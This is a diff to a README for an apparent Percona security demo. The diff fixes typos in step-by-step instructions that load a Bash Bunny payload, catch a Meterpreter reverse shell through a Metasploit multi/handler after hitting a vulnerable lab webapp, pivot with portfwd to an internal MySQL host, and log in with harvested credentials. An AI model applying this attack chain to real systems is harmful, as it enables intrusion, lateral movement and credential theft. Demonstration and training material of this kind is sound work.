@@ -1,13 +1,13 @@
 .. Copyright 2017 Percona LLC / David Busby
 
-#. Bashbunny payload is designed to work on Kali sana / debina Linux desktop running Gnome, paths in the ducky_script.txt will need chaging for your environment
+#. Bashbunny payload is designed to work on Kali sana / debian Linux desktop running Gnome, paths in the ducky_script.txt will need chaging for your environment
 #. Load the bashbunny with bashbunny/payloads/switch1/*
 #. `sync` && eject bashbunny
 #. Unplug bashbunny, slide switch to position 1
 #. re-plug bashbunny, allow to run light will show green when done it should be at the point of MSFconsole running `exploit` to start the multi/handler
 #. in a new tab `curl -skv http://172.16.33.2/vuln_webapp/images.php 2>/dev/null &`
 #. msfconsole _should_ get a new session
-#. You may want to demonstrated you can not reach 3306/tcp on 172.16.33.3 at this point e.g. `nc -v 172.16.33.3 3306`
+#. You may want to demonstrate you can not reach 3306/tcp on 172.16.33.3 at this point e.g. `nc -v 172.16.33.3 3306`
 #. In msfconsole run: `portfwd add -l 3306 -p 3306 -r 172.16.33.3`
 #. Use credentials from `cat.sqli` in the meterepter session to run on the CnC / localhost `mysql -uvuln_webapp -ppluk`
 #. In mysql run the follwing `show grants(); select whomami();`
